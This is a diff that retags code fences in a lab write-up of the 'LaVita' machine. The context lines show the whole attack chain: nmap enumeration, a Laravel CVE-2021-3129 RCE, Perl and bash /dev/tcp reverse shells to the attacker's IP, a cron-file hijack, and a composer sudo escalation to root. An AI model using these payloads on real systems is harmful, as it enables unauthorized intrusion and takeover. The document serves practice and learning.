@@ -3,7 +3,7 @@
 # 🐧LaVita🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.109.38 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 11:41 AEDT
 
@@ -16,7 +16,7 @@ port 80 is running a web of Laravel 8.4.0
 search google and found CVE-2021-3129 and allowing us to use RCE  
   
 https://github.com/joshuavanderpoll/CVE-2021-3129
-```
+```console
 $ python3 CVE-2021-3129.py   
   _____   _____   ___ __ ___ _    _____ ___ ___ 
  / __\ \ / / __|_|_  )  \_  ) |__|__ / |_  ) _ \                                                                  
@@ -55,11 +55,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 for some reason, bash and nc doesn't work for me  
 to get a reverse shell i used perl
-```
+```console
 [?] Please enter a command to execute : execute perl -e 'use Socket;$i="192.168.45.201";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 
 ```
-```
+```console
 $ nc -lvnp 80 
 listening on [any] 80 ...
 connect to [192.168.45.201] from (UNKNOWN) [192.168.109.38] 53402
@@ -69,13 +69,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 we don't have any privilege then we upload linpeas and found there is a user skunk is in sudo group  
 if we can get his account we maybe able to sudo to root
-```
+```console
 ╔══════════╣ All users & groups
 uid=0(root) gid=0(root) groups=0(root)                                                                            
 uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
 ```
 we upload pspy32s to see what is running in the background  
-```
+```console
 www-data@debian:/tmp$ ./pspy32s
 ./pspy32s
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
@@ -106,13 +106,13 @@ pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 ```
 we found that there is a cornjob running every minute by UID=1001 which is skunk  
 it is a php script and we found we have write access to the file artisan  
-```
+```console
 www-data@debian:/tmp$ ls -la /var/www/html/lavita/artisan
 -rw-r--r-- 1 www-data www-data 1763 Feb  9 01:05 /var/www/html/lavita/artisan
 ```
 so we put our reverseshell payload in the file  
 after one minute, we should be able to get the shell of skunk
-```
+```console
 $ echo "<?php shell_exec('bash -c \"bash -i >& /dev/tcp/192.168.45.201/22 0>&1\"'); ?>" > /var/www/html/lavita/artisan
 
 $ nc -lvnp 22
@@ -126,7 +126,7 @@ uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
 ## Privilege Escalation
 
 we can run root without password of command composer
-```
+```console
 bash-5.1$ sudo -l
 sudo -l
 Matching Defaults entries for skunk on debian:
@@ -139,22 +139,22 @@ User skunk may run the following commands on debian:
 ```
 check GTFOBin and found the way to get root  
 https://gtfobins.org/gtfobins/composer/#shell
-```
+```console
 echo '{"scripts":{"x":"/bin/sh"}}' > composer.json
 composer run-script x
 ```
 we have to edit composer.json file in /var/www/html/lavita  
 but only www-data have this permission  
-```
+```console
 bash-5.1$ ls -la /var/www/html/lavita/composer.json
 -rwxr-xr-x  1 www-data www-data      39 Feb  9 01:20 composer.json
 ```
 we switch back to www-data and edit the file
-```
+```console
 echo '{"scripts":{"x":"/bin/sh"}}' > /var/www/html/lavita/composer.json
 ```
 switch to skunk to execute the command 
-```
+```console
 bash-5.1$ sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
 Do not run Composer as root/super user! See https://getcomposer.org/root for details
 Continue as root/super user [yes]? yes
